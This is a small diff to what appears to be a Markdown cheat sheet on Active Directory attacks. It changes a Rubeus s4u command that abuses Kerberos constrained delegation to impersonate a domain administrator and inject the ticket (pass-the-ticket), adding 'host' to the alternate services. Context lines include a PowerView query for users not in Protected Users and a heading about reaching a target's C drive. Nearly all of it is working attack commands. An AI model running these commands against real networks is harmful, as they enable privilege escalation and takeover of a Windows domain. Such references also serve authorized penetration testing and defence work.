@@ -848,7 +848,7 @@ Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccount
 ```
 .\Rubeus.exe s4u /user:<USER OR COMPUTER$> /rc4:<HASH> /impersonateuser:<TARGET USER DA> /msdsspn:cifs/<TARGET COMPUTER> /ptt
 
-.\Rubeus.exe s4u /user:<USER OR COMPUTER$> /rc4:<HASH> /impersonateuser:<TARGET USER DA> /msdsspn:host/<TARGET COMPUTER> /altservice:ldap,rpc,http,cifs /ptt
+.\Rubeus.exe s4u /user:<USER OR COMPUTER$> /rc4:<HASH> /impersonateuser:<TARGET USER DA> /msdsspn:host/<TARGET COMPUTER> /altservice:ldap,rpc,http,cifs,host /ptt
 ```
 
 #### Access the C Disk if user is local admin to the target machine (When impersonating DA)
